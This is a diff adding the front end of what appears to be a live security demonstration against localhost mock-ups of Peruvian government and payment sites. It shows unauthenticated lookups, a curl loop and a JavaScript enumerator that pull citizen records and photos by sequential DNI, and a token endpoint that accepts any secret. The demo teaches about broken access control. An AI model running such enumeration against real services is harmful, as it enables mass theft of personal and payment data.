+<!-- ====== MAIN CONTENT ====== -->
+<main class="main-content">
+
+  <!-- SECTION 1: Consulta de Ciudadano -->
+  <div id="section-consulta" class="section active">
+    <!-- Hackathon banner — looks like the real ONPE event page -->
+    <div style="background:linear-gradient(135deg,#1e3a5f 0%,#2d5a8e 100%);border-radius:6px;padding:28px 32px 20px;margin-bottom:20px;color:white;position:relative;overflow:hidden;">
+      <div style="position:absolute;top:-20px;right:-20px;width:120px;height:120px;border-radius:50%;background:rgba(255,255,255,0.06);"></div>
+      <div style="position:absolute;bottom:-30px;right:60px;width:80px;height:80px;border-radius:50%;background:rgba(255,255,255,0.04);"></div>
+      <div style="font-size:0.65rem;text-transform:uppercase;letter-spacing:0.1em;opacity:0.6;margin-bottom:6px;">Oficina Nacional de Procesos Electorales</div>
+      <h2 style="font-family:var(--font-serif);font-size:1.3rem;margin-bottom:4px;font-weight:700;">Hackathon Voto Electronico 2018</h2>
+      <p style="font-size:0.82rem;opacity:0.7;">Formulario de Inscripcion — Valida tu identidad para participar</p>
+    </div>
+
+    <div class="search-panel">
+      <h2>Paso 1: Validar Identidad</h2>
+      <p class="subtitle">Ingrese su numero de DNI para verificar sus datos y completar la inscripcion</p>
+
+      <div class="search-row">
+        <div class="search-field">
+          <label>Numero de DNI</label>
+          <input type="text" id="dni-input" placeholder="Ej: 44556677" maxlength="8" autocomplete="off">
+        </div>
+      </div>
+
+      <div style="margin-top:14px;">
+        <button class="btn-gov" onclick="consultarCiudadano()" style="background:#b91c1c;">VALIDAR</button>
+      </div>
+
+      <div class="quick-fills">
+        <span class="qf-label">DNIs de prueba:</span>
+        <button class="qf-chip" onclick="quickFill('dni-input', '44556677', consultarCiudadano)">44556677</button>
+        <button class="qf-chip" onclick="quickFill('dni-input', '44556670', consultarCiudadano)">44556670</button>
+        <button class="qf-chip" onclick="quickFill('dni-input', '44556673', consultarCiudadano)">44556673</button>
+        <button class="qf-chip" onclick="quickFill('dni-input', '44556675', consultarCiudadano)">44556675</button>
+        <button class="qf-chip" onclick="quickFill('dni-input', '44556678', consultarCiudadano)">44556678</button>
+      </div>
+    </div>
+
+    <div id="ciudadano-error" class="error-msg"></div>
+
+    <!-- The auto-filled form — this is what appeared when you clicked VALIDAR -->
+    <div id="ciudadano-result" class="result-card">
+      <div class="result-header">
+        <h3>Datos del Participante (auto-completados)</h3>
+        <span class="badge" style="background:#b91c1c;color:white;">VALIDADO</span>
+      </div>
+      <div class="result-body">
+        <div class="result-grid" id="ciudadano-grid"></div>
+      </div>
+    </div>
+
+    <!-- The reveal: "but what ACTUALLY happened?" -->
+    <button id="net-reveal-btn" class="net-reveal-btn" style="display:none;" onclick="revealInspector()">
+      Que paso detras de este formulario?
+    </button>
+
+    <!-- Network inspector — shows the raw HTTP request -->
+    <div id="net-inspector" class="net-inspector">
+      <div class="net-inspector-bar">
+        <span class="dot dot-red"></span>
+        <span class="dot dot-yellow"></span>
+        <span class="dot dot-green"></span>
+        <span style="margin-left:8px;" class="tab-active">Network</span>
+        <span class="tab-inactive">Console</span>
+        <span class="tab-inactive">Sources</span>
+        <span class="tab-inactive">Application</span>
+      </div>
+      <div class="net-inspector-content" id="net-inspector-content">
+      </div>
+    </div>
+
+    <!-- Curl equivalent — the "you don't even need the form" moment -->
+    <div id="net-curl" class="net-curl">
+      <div class="comment"># No necesitas el formulario. Solo esta linea:</div>
+      <div><span class="cmd">curl</span> <span class="url-highlight" id="curl-url"></span></div>
+      <div style="margin-top:10px;" class="comment"># Y para descargar TODOS los ciudadanos:</div>
+      <div><span class="cmd">for</span> i <span class="cmd">in</span> $(seq 44556670 44556709); <span class="cmd">do</span></div>
+      <div style="padding-left:20px;"><span class="cmd">curl</span> <span class="url-highlight">http://localhost:3333/api/v1/ciudadano/$i</span></div>
+      <div><span class="cmd">done</span></div>
+    </div>
+  </div>
+
+  <!-- SECTION 2: Consulta de Foto -->
+  <div id="section-foto" class="section">
+
+    <div class="foto-search-panel">
+      <h2>Consulta de Fotografia — Padron Nominal</h2>
+      <p class="subtitle">Sistema de consulta fotografica para entidades autorizadas del Ministerio de Salud</p>
+
+      <!-- STEP 1: DNI input -->
+      <div class="b64-step">
+        <div class="b64-step-label"><span class="b64-step-num">1</span> Ingresar DNI</div>
+        <div style="display:flex;gap:12px;align-items:center;">
+          <input type="text" id="foto-dni-input" placeholder="Ej: 44556677" maxlength="8" autocomplete="off"
+            style="flex:1;padding:10px 14px;border:1px solid var(--gov-border);border-radius:3px;font-size:1rem;font-family:var(--font-mono);letter-spacing:0.08em;">
+          <button class="btn-gov" onclick="consultarFotoDNI()">Obtener Foto</button>
+        </div>
+        <div class="quick-fills" style="margin-top:8px;">
+          <span class="qf-label">DNIs de prueba:</span>
+          <button class="qf-chip" onclick="setFotoDni('44556677')">44556677</button>
+          <button class="qf-chip" onclick="setFotoDni('44556670')">44556670</button>
+          <button class="qf-chip" onclick="setFotoDni('44556673')">44556673</button>
+          <button class="qf-chip" onclick="setFotoDni('44556680')">44556680</button>
+        </div>
+      </div>
+
+      <!-- STEP 2: Base64 encoding (auto-computed) -->
+      <div class="b64-step b64-step-derived" id="b64-step2" style="display:none;">
+        <div class="b64-step-label"><span class="b64-step-num">2</span> Codificado en Base64 <span class="b64-not-enc">(NO es encriptación — cualquiera puede revertirlo)</span></div>
+        <div class="b64-transform">
+          <span class="b64-from" id="b64-from-val">—</span>
+          <span class="b64-arrow">→</span>
+          <span class="b64-to" id="b64-to-val">—</span>
+        </div>
+      </div>
+
+      <!-- STEP 3: URL with Base64 -->
+      <div class="b64-step b64-step-derived" id="b64-step3" style="display:none;">
+        <div class="b64-step-label"><span class="b64-step-num">3</span> URL de la foto — sin contraseña, sin autenticación</div>
+        <div class="b64-url" id="b64-url-val">—</div>
+      </div>
+    </div>
+
+    <div id="foto-error" class="error-msg"></div>
+
+    <div id="foto-result" class="foto-result">
+      <div class="foto-card">
+        <div class="foto-card-img">
+          <img id="foto-img" src="" alt="Foto del ciudadano">
+          <span class="watermark">PADRON_NOMINAL</span>
+        </div>
+        <div class="foto-card-info">
+          <h3 id="foto-nombre"></h3>
+          <div id="foto-meta"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="gallery-controls" style="margin-top:24px;">
+      <button class="btn-gallery" onclick="startGallery()">Enumerar DNIs secuenciales</button>
+      <span class="gallery-status" id="gallery-status"></span>
+    </div>
+
+    <div class="foto-gallery" id="foto-gallery"></div>
+  </div>
+
+  <!-- SECTION 3: PagaFacil -->
+  <div id="section-pagafacil" class="section section-pagafacil">
+    <div class="fin-panel">
+      <h2>Autenticacion API</h2>
+      <p class="subtitle">Ingrese sus credenciales de comercio para obtener un token de acceso</p>
+      <div class="fin-form-row">
+        <div class="fin-field">
+          <label>Client ID</label>
+          <input type="text" id="client-id-input" placeholder="Ej: 8872" autocomplete="off">
+        </div>
+        <div class="fin-field">
+          <label>Client Secret</label>
+          <input type="text" id="secret-input" placeholder="Ingrese su secret" autocomplete="off">
+        </div>
+        <button class="btn-fin" onclick="obtenerToken()">Obtener Token</button>
+      </div>
+      <div class="quick-fills">
+        <span class="qf-label">Secrets (cualquiera funciona):</span>
+        <button class="qf-chip fin" onclick="quickFillAuth('8872', 'lalalala')">lalalala</button>
+        <button class="qf-chip fin" onclick="quickFillAuth('8872', 'abc123')">abc123</button>
+        <button class="qf-chip fin" onclick="quickFillAuth('8872', 'x')">x</button>
+        <button class="qf-chip fin" onclick="quickFillAuth('8872', 'password123')">password123</button>
+      </div>
+      <div class="quick-fills" style="margin-top:6px;">
+        <span class="qf-label">Otros comercios (IDs secuenciales):</span>
+        <button class="qf-chip fin" onclick="quickFillAuth('8870', 'lalalala')">8870 Restaurante</button>
+        <button class="qf-chip fin" onclick="quickFillAuth('8871', 'lalalala')">8871 Clinica</button>
+        <button class="qf-chip fin" onclick="quickFillAuth('8872', 'lalalala')">8872 Electronica</button>
+        <button class="qf-chip fin" onclick="quickFillAuth('8873', 'lalalala')">8873 Farmacia</button>
+        <button class="qf-chip fin" onclick="quickFillAuth('8874', 'lalalala')">8874 Viajes</button>
+        <button class="qf-chip fin" onclick="quickFillAuth('8875', 'lalalala')">8875 Supermercado</button>
+      </div>
+
+      <div id="pf-error" class="error-msg"></div>
+
+      <div id="token-display" class="token-display">
+        <div class="token-label">Access Token</div>
+        <div class="token-value" id="token-value"></div>
+        <div class="token-meta">
+          Comercio: <span id="token-comercio"></span> &middot;
+          Scope: <span id="token-scope"></span> &middot;
+          Expira en: <span>3600s</span>
+        </div>
+      </div>
+    </div>
+
+    <div id="txn-panel" class="txn-panel">
+      <div class="txn-header">
+        <h3>Transacciones del Comercio</h3>
+        <span class="txn-count" id="txn-count"></span>
+      </div>
+      <table class="txn-table">
+        <thead>
+          <tr>
+            <th>Fecha</th>
+            <th>Cliente</th>
+            <th>Monto</th>
+            <th>Tarjeta</th>
+            <th>Estado</th>
+            <th></th>
+          </tr>
+        </thead>
+        <tbody id="txn-body"></tbody>
+      </table>
+    </div>
+  </div>
+
+</main>
+
+<footer class="gov-footer" id="main-footer">
+  <div>Sistema de Consulta Interinstitucional &middot; Uso exclusivo de entidades autorizadas</div>
+  <div class="version">v2.4.1-prod &middot; Ultima actualizacion: 2025-02-15</div>
+</footer>
+
+<script>
+// ============================================================
+// Navigation
+// ============================================================
+let currentToken = null;
+
+function switchSection(name) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.getElementById('section-' + name).classList.add('active');
+
+  // Switch chrome between gov and fintech
+  const isFintech = name === 'pagafacil';
+  document.getElementById('gov-chrome').style.display = isFintech ? 'none' : '';
+  document.getElementById('fin-chrome').style.display = isFintech ? '' : 'none';
+  document.body.style.background = isFintech ? '#f8fafc' : '#f5f4f0';
+  document.getElementById('main-footer').style.display = isFintech ? 'none' : '';
+
+  // Update nav active states
+  document.querySelectorAll('.nav-tab').forEach(t => {
+    t.classList.toggle('active', t.dataset.section === name);
+  });
+}
+
+// ============================================================
+// Section 1: Consulta de Ciudadano
+// ============================================================
+// Network inspector state
+let netRequests = [];
+
+function addNetRequest(method, url, status, responseData, startTime) {
+  const elapsed = Date.now() - startTime;
+  netRequests.push({ method, url, status, responseData, elapsed });
+
+  const container = document.getElementById('net-inspector-content');
+  const entry = document.createElement('div');
+  entry.className = 'net-req';
+
+  const authHeader = '(ninguno)';
+  const jsonPreview = JSON.stringify(responseData, null, 2);
+
+  entry.innerHTML = `
+    <div>
+      <span class="method">${method}</span>
+      <span class="url">${url}</span>
+      <span class="status-badge ok">${status}</span>
+      <span class="time">${elapsed}ms</span>
+    </div>
+    <div class="header-line"><span class="header-key">Authorization:</span> <span class="no-auth">${authHeader}</span></div>
+    <div class="header-line"><span class="header-key">Content-Type:</span> <span class="header-val">application/json</span></div>
+    <div class="response-preview">${escapeHtml(jsonPreview)}</div>
+  `;
+  container.appendChild(entry);
+  container.scrollTop = container.scrollHeight;
+}
+
+function escapeHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function revealInspector() {
+  document.getElementById('net-inspector').classList.add('visible');
+  document.getElementById('net-reveal-btn').style.display = 'none';
+
+  // After a pause, show the curl equivalent
+  setTimeout(() => {
+    document.getElementById('net-curl').classList.add('visible');
+  }, 2000);
+}
+
+async function consultarCiudadano() {
+  const dni = document.getElementById('dni-input').value.trim();
+  const errorEl = document.getElementById('ciudadano-error');
+  const resultEl = document.getElementById('ciudadano-result');
+
+  errorEl.classList.remove('visible');
+  resultEl.classList.remove('visible');
+
+  if (!dni || dni.length !== 8) {
+    errorEl.textContent = 'Ingrese un numero de DNI valido (8 digitos)';
+    errorEl.classList.add('visible');
+    return;
+  }
+
+  const apiUrl = '/api/v1/ciudadano/' + dni;
+  const startTime = Date.now();
+
+  try {
+    const res = await fetch(apiUrl);
+    const data = await res.json();
+
+    if (!res.ok) {
+      errorEl.textContent = data.error || 'Ciudadano no encontrado';
+      errorEl.classList.add('visible');
+      return;
+    }
+
+    // Log to network inspector
+    addNetRequest('GET', apiUrl, '200 OK', data, startTime);
+
+    // Update curl display
+    document.getElementById('curl-url').textContent = 'http://localhost:3333' + apiUrl;
+
+    // The real ONPE endpoint returned: name, sex, age/DOB, DNI
+    const r = data;
+    const grid = document.getElementById('ciudadano-grid');
+    grid.innerHTML = `
+      <div class="result-field full-width">
+        <label>Nombre Completo</label>
+        <div class="value" style="font-size:1.1rem;font-weight:600;">${r.nombre_completo}</div>
+      </div>
+      <div class="result-field">
+        <label>DNI</label>
+        <div class="value mono">${r.dni}</div>
+      </div>
+      <div class="result-field">
+        <label>Fecha de Nacimiento</label>
+        <div class="value">${formatDate(r.fecha_nacimiento)}</div>
+      </div>
+      <div class="result-field">
+        <label>Sexo</label>
+        <div class="value">${r.sexo === 'M' ? 'Masculino' : 'Femenino'}</div>
+      </div>
+    `;
+
+    resultEl.classList.add('visible');
+
+    // Show the reveal button after first successful query
+    document.getElementById('net-reveal-btn').style.display = '';
+  } catch (err) {
+    errorEl.textContent = 'Error de conexion: ' + err.message;
+    errorEl.classList.add('visible');
+  }
+}
+
+// Enter key support
+document.getElementById('dni-input').addEventListener('keydown', e => {
+  if (e.key === 'Enter') consultarCiudadano();
+});
+
+// ============================================================
+// Section 2: Consulta de Foto
+// ============================================================
+function setFotoDni(dni) {
+  document.getElementById('foto-dni-input').value = dni;
+  consultarFotoDNI();
+}
+
+document.getElementById('foto-dni-input').addEventListener('keydown', e => {
+  if (e.key === 'Enter') consultarFotoDNI();
+});
+
+document.getElementById('foto-dni-input').addEventListener('input', () => {
+  const dni = document.getElementById('foto-dni-input').value.trim();
+  if (dni.length === 8) {
+    const encoded = btoa(dni);
+    document.getElementById('b64-from-val').textContent = dni;
+    document.getElementById('b64-to-val').textContent = encoded;
+    document.getElementById('b64-url-val').textContent =
+      'GET http://localhost:3333/api/foto/' + encoded + '\nAuthorization: (ninguno)';
+    document.getElementById('b64-step2').style.display = '';
+    document.getElementById('b64-step3').style.display = '';
+  } else {
+    document.getElementById('b64-step2').style.display = 'none';
+    document.getElementById('b64-step3').style.display = 'none';
+  }
+});
+
+async function consultarFotoDNI() {
+  const dni = document.getElementById('foto-dni-input').value.trim();
+  const errorEl = document.getElementById('foto-error');
+  const resultEl = document.getElementById('foto-result');
+
+  errorEl.classList.remove('visible');
+  resultEl.classList.remove('visible');
+
+  if (!dni || dni.length !== 8) {
+    errorEl.textContent = 'Ingrese un numero de DNI valido (8 digitos)';
+    errorEl.classList.add('visible');
+    return;
+  }
+
+  const encoded = btoa(dni);
+
+  // Show steps animated
+  document.getElementById('b64-from-val').textContent = dni;
+  document.getElementById('b64-to-val').textContent = encoded;
+  document.getElementById('b64-url-val').textContent =
+    'GET http://localhost:3333/api/foto/' + encoded + '\nAuthorization: (ninguno)';
+  document.getElementById('b64-step2').style.display = '';
+  document.getElementById('b64-step3').style.display = '';
+
+  try {
+    const infoRes = await fetch('/api/foto/' + encodeURIComponent(encoded) + '/info');
+    if (!infoRes.ok) {
+      errorEl.textContent = 'Ciudadano no encontrado';
+      errorEl.classList.add('visible');
+      return;
+    }
+    const info = await infoRes.json();
+
+    document.getElementById('foto-img').src = '/api/foto/' + encodeURIComponent(encoded);
+    document.getElementById('foto-nombre').textContent = info.nombre_completo;
+
+    const meta = document.getElementById('foto-meta');
+    meta.innerHTML = `
+      <div class="foto-meta-row"><span class="label">DNI</span><span class="val">${info.dni}</span></div>
+      <div class="foto-meta-row"><span class="label">Sistema</span><span class="val">${info.sistema}</span></div>
+      <div class="foto-meta-row"><span class="label">Ministerio</span><span class="val">${info.ministerio}</span></div>
+    `;
+
+    resultEl.classList.add('visible');
+  } catch (err) {
+    errorEl.textContent = 'Error: ' + err.message;
+    errorEl.classList.add('visible');
+  }
+}
+
+async function startGallery() {
+  const gallery = document.getElementById('foto-gallery');
+  const status = document.getElementById('gallery-status');
+  gallery.innerHTML = '';
+
+  // Scroll gallery into view so it's visible during recording
+  document.querySelector('.gallery-controls').scrollIntoView({ behavior: 'smooth', block: 'start' });
+  await new Promise(r => setTimeout(r, 800));
+
+  const baseDni = 44556670;
+  let fetched = 0;
+
+  for (let i = 0; i < 40; i++) {
+    const dni = (baseDni + i).toString();
+    const encoded = btoa(dni);
+
+    // Show each encoding step live
+    document.getElementById('foto-dni-input').value = dni;
+    document.getElementById('b64-from-val').textContent = dni;
+    document.getElementById('b64-to-val').textContent = encoded;
+    document.getElementById('b64-url-val').textContent =
+      'GET http://localhost:3333/api/foto/' + encoded + '\nAuthorization: (ninguno)';
+    document.getElementById('b64-step2').style.display = '';
+    document.getElementById('b64-step3').style.display = '';
+    status.textContent = `Enumerando... DNI ${dni} → ${encoded}`;
+
+    try {
+      const infoRes = await fetch('/api/foto/' + encodeURIComponent(encoded) + '/info');
+      if (!infoRes.ok) continue;
+      const info = await infoRes.json();
+
+      const item = document.createElement('div');
+      item.className = 'gallery-item';
+      item.innerHTML = `
+        <img src="/api/foto/${encodeURIComponent(encoded)}" alt="${info.nombre_completo}">
+        <div class="gallery-item-info">
+          <div class="name">${info.nombre_completo}</div>
+          <div class="dni-num">${dni} → ${encoded}</div>
+        </div>
+      `;
+      gallery.appendChild(item);
+      fetched++;
+    } catch { /* skip */ }
+
+    await new Promise(r => setTimeout(r, 250));
+  }
+  status.textContent = `${fetched} fotos — DNIs ${baseDni}–${baseDni + 39}, codificados en Base64`;
+}
+
+// ============================================================
+// Section 3: PagaFacil
+// ============================================================
+async function obtenerToken() {
+  const clientId = document.getElementById('client-id-input').value.trim();
+  const secret = document.getElementById('secret-input').value;
+  const errorEl = document.getElementById('pf-error');
+  const tokenDisplay = document.getElementById('token-display');
+  const txnPanel = document.getElementById('txn-panel');
+
+  errorEl.classList.remove('visible');
+  tokenDisplay.classList.remove('visible');
+  txnPanel.classList.remove('visible');
+
+  if (!clientId) {
+    errorEl.textContent = 'client_id es requerido';
+    errorEl.classList.add('visible');
+    return;
+  }
+
+  try {
+    const res = await fetch('/api/oauth/token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ client_id: clientId, secret: secret })
+    });
+    const data = await res.json();
+
+    if (!res.ok) {
+      errorEl.textContent = data.error || 'Error de autenticacion';
+      errorEl.classList.add('visible');
+      return;
+    }
+
+    currentToken = data.access_token;
+    document.getElementById('token-value').textContent = data.access_token;
+    document.getElementById('token-comercio').textContent = data.comercio;
+    document.getElementById('token-scope').textContent = data.scope;
+    tokenDisplay.classList.add('visible');
+
+    // Automatically load transactions
+    await loadTransactions();
+  } catch (err) {
+    errorEl.textContent = 'Error: ' + err.message;
+    errorEl.classList.add('visible');
+  }
+}
+
+document.getElementById('secret-input').addEventListener('keydown', e => {
+  if (e.key === 'Enter') obtenerToken();
+});
+
+async function loadTransactions() {
+  if (!currentToken) return;
+
+  try {
+    const res = await fetch('/api/collections?status=approved', {
+      headers: { 'Authorization': 'Bearer ' + currentToken }
+    });
+    const data = await res.json();
+
+    if (!res.ok) return;
+
+    document.getElementById('txn-count').textContent = data.total_resultados + ' transacciones';
+    const tbody = document.getElementById('txn-body');
+    tbody.innerHTML = '';
+
+    data.transacciones.forEach((txn, idx) => {
+      const row = document.createElement('tr');
+      row.innerHTML = `
+        <td>${formatDateTime(txn.fecha)}</td>
+        <td style="font-weight:600;">${txn.cliente.nombre}</td>
+        <td class="txn-amount">S/ ${txn.monto.toLocaleString('es-PE', { minimumFractionDigits: 2 })}</td>
+        <td class="txn-card-info">${txn.tarjeta_marca} ${txn.tarjeta_parcial}</td>
+        <td><span class="txn-status ${txn.estado}">${txn.estado}</span></td>
+        <td><button class="txn-expand" onclick="toggleTxnDetail(${idx})">Ver datos</button></td>
+      `;
+      tbody.appendChild(row);
+
+      const detailRow = document.createElement('tr');
+      detailRow.className = 'txn-details';
+      detailRow.id = 'txn-detail-' + idx;
+      detailRow.innerHTML = `
+        <td colspan="6">
+          <div class="txn-detail-grid">
+            <div class="txn-detail-item">
+              <label>DNI del Cliente</label>
+              <div class="val sensitive">${txn.cliente.dni}</div>
+            </div>
+            <div class="txn-detail-item">
+              <label>Email</label>
+              <div class="val sensitive">${txn.cliente.email}</div>
+            </div>
+            <div class="txn-detail-item">
+              <label>Telefono</label>
+              <div class="val sensitive">${txn.cliente.telefono}</div>
+            </div>
+            <div class="txn-detail-item">
+              <label>Tarjeta</label>
+              <div class="val">${txn.tarjeta_parcial}</div>
+            </div>
+            <div class="txn-detail-item">
+              <label>Expiracion</label>
+              <div class="val sensitive">${txn.tarjeta_expiracion}</div>
+            </div>
+            <div class="txn-detail-item">
+              <label>Descripcion</label>
+              <div class="val">${txn.descripcion}</div>
+            </div>
+          </div>
+        </td>
+      `;
+      tbody.appendChild(detailRow);
+    });
+
+    document.getElementById('txn-panel').classList.add('visible');
+  } catch { /* ignore */ }
+}
+
+function toggleTxnDetail(idx) {
+  const row = document.getElementById('txn-detail-' + idx);
+  row.classList.toggle('visible');
+  row.style.display = row.classList.contains('visible') ? 'table-row' : 'none';
+}
+
+// ============================================================
+// Quick-fill helpers for live demo
+function quickFill(inputId, value, callback) {
+  document.getElementById(inputId).value = value;
+  if (callback) callback();
+}
+
+function quickFillFoto(dni) {
+  setFotoDni(dni);
+}
+
+function quickFillAuth(clientId, secret) {
+  document.getElementById('client-id-input').value = clientId;
+  document.getElementById('secret-input').value = secret;
+  obtenerToken();
+}
+
+// Request counter — polls the backend
+let counterInterval = null;
+let counterVisible = false;
+
+function toggleCounter() {
+  counterVisible = !counterVisible;
+  document.getElementById('req-counter').classList.toggle('hidden', !counterVisible);
+  if (counterVisible) {
+    // Reset counter on the backend
+    fetch('/api/counter/reset', { method: 'POST' });
+    counterInterval = setInterval(updateCounter, 500);
+    updateCounter();
+  } else {
+    clearInterval(counterInterval);
+  }
+}
+
+async function updateCounter() {
+  try {
+    const res = await fetch('/api/counter');
+    const data = await res.json();
+    document.getElementById('counter-num').textContent = data.requests;
+    document.getElementById('counter-time').textContent = data.seconds + 's';
+  } catch {}
+}
+
+// Auto-switch section from URL param e.g. /?section=foto
+const urlSection = new URLSearchParams(window.location.search).get('section');
+if (urlSection) switchSection(urlSection);
+
+// Keyboard shortcuts for switching acts during presentation
+document.addEventListener('keydown', (e) => {
+  // Only trigger if not typing in an input field
+  if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+  if (e.key === '1') switchSection('consulta');
+  if (e.key === '2') switchSection('foto');
+  if (e.key === '3') switchSection('pagafacil');
+  if (e.key === 'c' || e.key === 'C') toggleCounter(); // C = counter
+});
+
+// Utilities
+// ============================================================
+function formatDate(iso) {
+  const d = new Date(iso + 'T00:00:00');
+  return d.toLocaleDateString('es-PE', { day: '2-digit', month: 'long', year: 'numeric' });
+}
+
+function formatDateTime(iso) {
+  const d = new Date(iso);
+  return d.toLocaleDateString('es-PE', { day: '2-digit', month: 'short', year: 'numeric' }) + ' ' +
+         d.toLocaleTimeString('es-PE', { hour: '2-digit', minute: '2-digit' });
+}
+</script>
+</body>
+</html>
